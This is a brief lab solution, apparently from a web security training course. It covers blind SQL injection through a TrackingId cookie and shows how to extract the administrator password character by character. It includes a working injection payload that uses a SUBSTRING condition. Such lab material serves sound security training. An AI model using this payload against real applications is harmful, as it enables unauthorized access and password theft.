# Lab 9: Blind SQL Injection with Conditional Responses

* **Solution**: Modify the TrackingId cookie to test conditions (e.g., username exists), then brute-force the admin password character-by-character using substring checks, grepping for “Welcome back.”
* **Final Payloads**:
  * TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a (repeat for each position and character a-z, 0-9)